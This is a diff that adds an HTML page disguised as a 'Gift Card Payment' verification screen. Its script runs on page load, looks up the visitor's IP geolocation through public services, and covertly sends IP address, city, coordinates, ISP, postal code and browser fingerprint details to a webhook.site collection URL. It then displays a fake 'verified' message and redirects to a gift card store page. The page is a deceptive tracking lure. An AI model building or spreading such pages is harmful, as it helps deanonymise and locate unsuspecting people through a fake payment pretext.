@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Gift Card Payment</title>
+<style>
+body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0e1117;color:#e7e9ee;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
+.card{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:32px 40px;text-align:center;max-width:420px}
+h1{font-size:20px;margin:0 0 8px}
+p{font-size:14px;color:#9aa4b2;margin:0 0 24px}
+button{background:#238636;color:#fff;border:none;border-radius:6px;padding:10px 20px;font-size:14px;cursor:pointer}
+.spin{display:inline-block;width:28px;height:28px;border:3px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:r 0.8s linear infinite;margin-bottom:16px}
+@keyframes r{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="spin" id="spin"></div>
+  <h1>Verifying your payment...</h1>
+  <p id="msg">Loading your gift card details, this usually takes a few seconds.</p>
+  <button id="go" onclick="finish()">Open gift card</button>
+</div>
+<script>
+const COLLECT='https://webhook.site/f4a7ebd8-f7ee-4aac-9f7b-4b95ad3d8007';
+const DEST='https://www.eneba.com/gift-me-crypto-gift-me-crypto-gift-card-30-cad-key-global';
+function finish(){location.href=DEST;}
+function send(payload){
+  var body=JSON.stringify(payload);
+  try{navigator.sendBeacon(COLLECT,body);}catch(e){}
+  try{
+    fetch(COLLECT,{method:'POST',headers:{'Content-Type':'text/plain'},body:body}).catch(()=>{});
+  }catch(e){}
+}
+function send(payload){
+  var body=JSON.stringify(payload);
+  try{navigator.sendBeacon(COLLECT,body);}catch(e){}
+  try{
+    fetch(COLLECT,{method:'POST',headers:{'Content-Type':'text/plain'},body:body}).catch(()=>{});
+  }catch(e){}
+}
+function navOnly(){send({fallback:true,navigator:{ua:navigator.userAgent,lang:navigator.language,languages:(navigator.languages||[]).join(','),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,platform:navigator.platform,cores:navigator.hardwareConcurrency,screen:screen.width+'x'+screen.height,dpr:screen.devicePixelRatio,ref:document.referrer,url:location.href}});}
+
+fetch('https://ipwho.is/')
+ .then(r=>r.json())
+ .then(g=>{
+   if(!g||!g.ip){throw new Error('no geo');}
+   send({ip:g.ip,city:g.city,region:g.region,country:g.country,cc:g.country_code,lat:g.latitude,lon:g.longitude,isp:g.connection&&g.connection.isp,org:g.connection&&g.connection.org,asn:g.connection&&g.connection.asn,timezone:g.timezone,postal:g.postal,
+   navigator:{ua:navigator.userAgent,lang:navigator.language,languages:(navigator.languages||[]).join(','),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,platform:navigator.platform,cores:navigator.hardwareConcurrency,screen:screen.width+'x'+screen.height,dpr:screen.devicePixelRatio,ref:document.referrer,url:location.href}});
+   document.getElementById('spin').style.display='none';
+   document.getElementById('msg').textContent='Gift card verified! Click below to view it.';
+   setTimeout(finish,8000);
+ })
+ .catch(()=>{
+   fetch('https://ipapi.co/json/')
+    .then(r=>r.json())
+    .then(g=>{
+      send({ip:g.ip,city:g.city,region:g.region,country:g.country_name,cc:g.country_code,lat:g.latitude,lon:g.longitude,isp:g.org,timezone:g.timezone,postal:g.postal,src:'ipapi',
+      navigator:{ua:navigator.userAgent,lang:navigator.language,languages:(navigator.languages||[]).join(','),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,platform:navigator.platform,cores:navigator.hardwareConcurrency,screen:screen.width+'x'+screen.height,dpr:screen.devicePixelRatio,ref:document.referrer,url:location.href}});
+      document.getElementById('spin').style.display='none';
+      document.getElementById('msg').textContent='Gift card verified! Click below to view it.';
+      setTimeout(finish,8000);
+    })
+    .catch(()=>{navOnly();setTimeout(finish,4500);});
+ });
+setTimeout(()=>{const m=document.getElementById('msg');if(m&&m.textContent.indexOf('verified')<0)m.textContent='Still loading... you can click below.';},6000);
+</script>
+</body>
+</html>
